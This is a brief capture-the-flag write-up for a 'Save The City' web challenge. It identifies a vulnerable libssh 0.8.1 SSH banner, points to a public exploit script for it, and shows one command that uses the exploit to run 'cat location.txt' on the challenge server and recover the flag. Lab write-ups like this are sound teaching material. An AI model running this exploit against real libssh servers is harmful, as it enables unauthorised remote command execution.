# Save The City
Web(200 points)

**DESCRIPTION**
> The RAW Has Got An Input That ISIS Has Planted a Bomb Somewhere In The Pune! Fortunetly, RAW Has Infiltratrated The Internet Activity of One Suspect And They Found This Link. You Have To Find The Location ASAP!

It was a remote challenge, on starting it with netcat, we get the following output:
`SSH-2.0-libssh_0.8.1`

I searched this on google and found this [CVE](https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d)
By downloading this payload, we can run this:
```
python3 filename.py  {target_ip} -p {port} -v -c 'cat location.txt'
```
We get the following text: `elrow-club-pune`
Putting this text inside the flag format is the flag:)
>VishwaCTF{elrow-club-pune}
